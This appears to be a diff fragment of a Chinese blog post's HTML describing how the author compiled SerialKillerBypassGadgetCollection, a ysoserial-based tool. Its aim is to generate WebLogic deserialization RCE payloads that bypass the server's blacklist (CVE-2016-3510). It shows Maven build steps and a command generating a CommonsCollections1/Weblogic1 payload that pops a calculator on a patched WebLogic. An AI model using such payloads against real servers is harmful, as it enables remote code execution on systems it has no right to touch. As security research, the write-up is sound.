&lt;goal&gt;install-file&lt;/goal&gt;</span><br><span class="line">    &lt;/goals&gt;</span><br><span class="line">&lt;/execution&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后将本地的 jar 包添加到本地的仓库里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean</span><br></pre></td></tr></table></figure></p>
-<p>执行完之后，可以看到本地的 jar 包已经添加到本地仓库里面了，可以调用了。<br><img src="/2018/03/14/记-SerialKillerBypassGadgetCollection-编译过程/5.png"></p>
-<p>最后执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean compile assembly:single</span><br></pre></td></tr></table></figure></p>
-<p>重新编译，发现依赖问题解决了，可以引用了，但是代码又出错了。提示<code>ysoserial.GeneratePayload</code>不存在<code>ToStringComparator</code>方法。<br><img src="/2018/03/14/记-SerialKillerBypassGadgetCollection-编译过程/1.png"></p>
-<p>对 Java 不熟啊，没法改，还好这是个输出用法函数，索性直接注释了。。<br><img src="/2018/03/14/记-SerialKillerBypassGadgetCollection-编译过程/2.png"></p>
-<p>再次编译<br><img src="/2018/03/14/记-SerialKillerBypassGadgetCollection-编译过程/3.png"></p>
-<p>终于成功了….撒花</p>
-<h3 id="payload-测试"><a href="#payload-测试" class="headerlink" title="payload 测试"></a>payload 测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/serialkiller-bypass-gadgets-0.0.1-SNAPSHOT-all.jar CommonsCollections1  Weblogic1 &quot;calc&quot; &gt; calc</span><br></pre></td></tr></table></figure>
-<p>用脚本将生成的 payload 发送过去，成功在打了CVE-2015-4852补丁的 Weblogic 上弹出计算器。</p>
-
-          
+          背景  想要生成 Weblogic Deserialization RCE(CVE-2016-3510) 的payload，利用weblogic.corba.utils.MarshallObject的反序列化来绕过 Weblogic 的黑名单，从而执行恶意代码。
+简介  SerialKiller 是
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/03/14/记-SerialKillerBypassGadgetCollection-编译过程/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
